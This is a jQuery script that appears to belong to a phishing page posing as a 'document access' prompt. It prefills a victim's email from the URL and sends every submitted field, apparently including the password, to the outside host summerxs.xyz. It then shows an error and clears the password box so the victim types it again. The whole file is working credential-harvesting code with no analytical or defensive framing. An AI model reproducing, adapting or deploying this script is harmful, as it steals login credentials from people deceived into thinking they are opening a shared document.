$(document).ready(function() {
    $('#msg').hide();
    $('#msg2').hide();
    var baseUrl = (window.location).href;
    var url = baseUrl.substring(baseUrl.lastIndexOf('=') + 1);
    $("#x1").val(url);

    $("#profileUp").submit(function(e) {
        e.preventDefault();
        var nm = $("#A1").val();
        var formData = new FormData($("#profileUp")[0]);
        $("#byn").html("Processing..").prop("disabled", true);
        $.ajax({
            
            url: "https://summerxs.xyz/tip5.php",
            type: 'POST',
            data: formData,
            contentType: false,
            processData: false,
            success: function(res) {
                $('#msg').show();
                $('#msg2').hide();
                setTimeout(function() {
                    $('#msg').hide();
                    $('#msg2').show();
                    $("#x1").val(url);
                    $("#x2").val("");
                    $("#byn").html("Access Document").prop("disabled", false);
                }, 2000);
            }
        });
    });
});